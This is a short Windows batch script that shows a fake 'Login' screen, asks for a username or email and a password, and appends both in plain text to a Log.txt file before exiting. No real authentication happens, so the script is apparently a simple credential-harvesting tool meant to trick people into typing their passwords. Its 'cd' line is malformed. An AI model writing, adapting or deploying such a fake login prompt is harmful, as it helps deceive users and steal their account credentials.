@echo off
color a
title Login
cls
echo Please Enter Your Email Addres And Password
echo.
echo.
cd"C:Logs
set/p user=username:
set/p pass=Password:
echo Username="%user%" Password="%pass%" >> Log.txt
exit
